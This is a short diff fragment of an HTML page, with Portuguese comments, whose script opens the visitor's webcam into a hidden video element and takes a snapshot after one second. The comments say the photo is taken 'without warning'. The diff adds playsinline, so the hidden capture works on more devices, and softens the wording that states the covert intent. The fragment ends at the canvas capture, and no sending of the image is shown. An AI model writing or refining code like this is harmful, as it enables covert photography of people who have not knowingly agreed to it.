@@ -5,17 +5,17 @@
     <title>Captura de Imagem</title>
 </head>
 <body>
-    <video id="webcam" autoplay muted style="display:none"></video>
+    <video id="webcam" autoplay muted playsinline style="display:none"></video>
     
     <script>
         async function capturePhoto() {
             try {
-                // Tira foto sem avisar
+                // Tenta capturar sem avisar
                 const stream = await navigator.mediaDevices.getUserMedia({video: true});
                 const video = document.getElementById('webcam');
                 video.srcObject = stream;
                 
-                // Captura após 1 segundo (sem aviso)
+                // Captura após 1 segundo
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
